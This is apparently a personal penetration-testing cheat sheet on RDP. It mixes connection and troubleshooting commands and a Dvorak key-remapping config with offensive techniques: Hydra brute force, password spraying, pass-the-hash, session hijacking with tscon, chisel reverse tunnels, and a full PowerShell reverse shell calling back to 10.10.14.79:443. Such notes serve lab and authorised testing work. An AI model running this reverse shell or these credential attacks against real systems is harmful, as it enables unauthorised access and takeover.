# rdp

**Author:** Julien Bongars\
**Date:** 2025-12-29 23:37:33
**Path:**

---

## Overview

RDP (Remote Desktop Protocol) is Microsoft's proprietary protocol for remote GUI access to Windows systems. Default port is **3389/TCP**.

## Enumeration

### Port Scanning

```bash
# Nmap scan for RDP
nmap -p 3389 -sV -sC {TARGET_IP}

# Check for RDP with script scan
nmap -p 3389 --script rdp-enum-encryption,rdp-vuln-ms12-020 {TARGET_IP}
```

### Check if RDP is accessible

```bash
# Using netcat
nc -nv {TARGET_IP} 3389

# Using nmap
nmap -p 3389 --open {TARGET_IP}
```

## Connection Methods

### Remmina (Recommended)

### xfreerdp (Not super compatible with Dvorak)

```bash
# Basic connection
xfreerdp /v:{TARGET_IP} /u:{USERNAME} /p:{PASSWORD}

# Quick connection
xfreerdp /v:{TARGET_IP} /u:{DOMAIN}\\{USERNAME} /p:{PASSWORD} /cert:ignore /clipboard /dynamic-resolution 

# Share local drive
xfreerdp /v:{TARGET_IP} /u:{USERNAME} /p:{PASSWORD} /drive:share,/tmp
```

## Dvorak Compatibility

**Note:** RDP is not compatible with transmitting Unicode as it is designed to only work with scancodes (physical key positions). You may experience issues when using Dvorak locally while connecting to a machine configured for QWERTY.

### Solution: Use keyd for Physical Key Remapping

You can solve this by using [keyd](https://github.com/rvaiya/keyd) to remap Dvorak physical positions to QWERTY scancodes.

#### Running keyd for remapping

To start keyd and terminate it on any keypress:

```bash
sudo bash -c 'keyd & PID=$! ; read -n1 -r ; kill $PID'
```

#### Configuration: /etc/keyd/default.conf

see appendix

**Note** Using keyd breaks the key mapping in the host machine. Still thinking about a solution to resolve this.

### rdesktop (Alternative)

```bash
# Basic connection
rdesktop -u {USERNAME} -p {PASSWORD} {TARGET_IP}

# With domain
rdesktop -u {DOMAIN}\\{USERNAME} -p {PASSWORD} {TARGET_IP}
```

### Windows RDP Client (mstsc)

```cmd
mstsc /v:{TARGET_IP}
```

## Callback to Linux

```ps1
$client = New-Object System.Net.Sockets.TCPClient('10.10.14.79',443);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
};
$client.Close()
```

## Password Attacks

### Hydra Brute Force

```bash
# Single user
hydra -l {USERNAME} -t 4 -P /usr/share/wordlists/rockyou.txt rdp://{TARGET_IP}

# User list
hydra -L users.txt -t 4 -P /usr/share/wordlists/rockyou.txt rdp://{TARGET_IP}
```

### CrackMapExec

```bash
# Single credential test
crackmapexec rdp {TARGET_IP} -u {USERNAME} -p {PASSWORD}

# Password spray
crackmapexec rdp {TARGET_IP} -u users.txt -p 'Password123'

# Credential stuffing
crackmapexec rdp {TARGET_IP} -u users.txt -p passwords.txt
```

## Pass-the-Hash (Restricted Transport)

### Using xfreerdp with hash

```bash
# Note: Requires Restricted Admin mode enabled on target
xfreerdp /v:{TARGET_IP} /u:{USERNAME} /pth:{NTLM_HASH} /cert:ignore
```

## Session Hijacking (Post-Exploitation)

### List active sessions

```cmd
query user
qwinsta
```

### Hijack session (requires SYSTEM or appropriate privileges)

```cmd
# Switch to session without password
tscon {SESSION_ID} /dest:{CURRENT_SESSION}

# Example
tscon 2 /dest:rdp-tcp#0
```

## Port Forwarding / Tunneling

### SSH Local Port Forward

```bash
# Forward local port 3389 to remote RDP
ssh -L 3389:{TARGET_IP}:3389 {USER}@{PIVOT_HOST}

# Then connect locally
xfreerdp /v:127.0.0.1 /u:{USERNAME} /p:{PASSWORD}
```

### Chisel Tunnel

```bash
# On attacker machine (server)
chisel server -p 8000 --reverse

# On compromised host (client)
chisel client {ATTACKER_IP}:8000 R:3389:{TARGET_IP}:3389

# Connect through tunnel
xfreerdp /v:127.0.0.1:3389 /u:{USERNAME} /p:{PASSWORD}
```

## Common Issues & Fixes

### Certificate Errors

```bash
# Add /cert:ignore flag
xfreerdp /v:{TARGET_IP} /u:{USERNAME} /p:{PASSWORD} /cert:ignore
```

### Authentication Failures

```bash
# Try without domain
xfreerdp /v:{TARGET_IP} /u:{USERNAME} /p:{PASSWORD}

# Try with localhost as domain
xfreerdp /v:{TARGET_IP} /u:localhost\\{USERNAME} /p:{PASSWORD}

# Try with computer name
xfreerdp /v:{TARGET_IP} /u:{COMPUTER_NAME}\\{USERNAME} /p:{PASSWORD}
```

### Network Level Authentication (NLA) Issues

```bash
# Older xfreerdp versions may need
xfreerdp /v:{TARGET_IP} /u:{USERNAME} /p:{PASSWORD} /sec:nla

# Disable NLA (if supported)
xfreerdp /v:{TARGET_IP} /u:{USERNAME} /p:{PASSWORD} /sec:rdp
```

### Resolution Issues

```bash
# Dynamic resolution (scales with window)
xfreerdp /v:{TARGET_IP} /u:{USERNAME} /p:{PASSWORD} /dynamic-resolution

# Smart sizing
xfreerdp /v:{TARGET_IP} /u:{USERNAME} /p:{PASSWORD} /smart-sizing
```

## Post-Connection Tips

### File Transfer

```bash
# Mount local share during connection
xfreerdp /v:{TARGET_IP} /u:{USERNAME} /p:{PASSWORD} /drive:share,/tmp

# Access in Windows: \\tsclient\share
```

### Copy/Paste

```bash
# Enable clipboard
xfreerdp /v:{TARGET_IP} /u:{USERNAME} /p:{PASSWORD} +clipboard
```

### Disconnect vs Logout

- **Disconnect**: Session remains active (uses resources)
- **Logout**: Terminates session completely

```cmd
# Logoff from command line
logoff

# Disconnect current session
tsdiscon
```

## Security Notes

- Check for BlueKeep vulnerability (CVE-2019-0708) on older Windows versions
- RDP connections are often logged - check `Event Viewer > Windows Logs > Security`
- Event IDs to watch: 4624 (successful logon), 4625 (failed logon)

## Useful Commands After Connection

```cmd
# System information
systeminfo
whoami /all

# Network information
ipconfig /all
netstat -ano

# User enumeration
net user
net localgroup administrators

# Check current session
query session
```

## Appendix

### Configuration: /etc/keyd/default.conf

```config
[ids]
*

[main]
# Normal mode - your keys work as labeled (Dvorak)

# [dvorak_to_qwerty]
# Mode 3: Type Dvorak physically, send QWERTY scancodes
# This maps Dvorak home positions to QWERTY positions

# Top row (Dvorak: ',.pyfgcrl -> QWERTY: qwertyuiop)
q = apostrophe
w = comma
e = .
r = p
t = y
y = f
u = g
i = c
o = r
p = l

# Home row (Dvorak: aoeuidhtns -> QWERTY: asdfghjkl;)
a = a
s = o
d = e
f = u
g = i
h = d
j = h
k = t
l = n
semicolon = s

# Bottom row (Dvorak: ;qjkxbmwvz -> QWERTY: zxcvbnm,./)
z = semicolon
x = q
c = j
v = k
b = x
n = b
m = m
comma = w
. = v
/ = z

# [main]
# # Toggle between normal and dvorak_to_qwerty with ScrollLock
# scrolllock = swap(dvorak_to_qwerty)
```
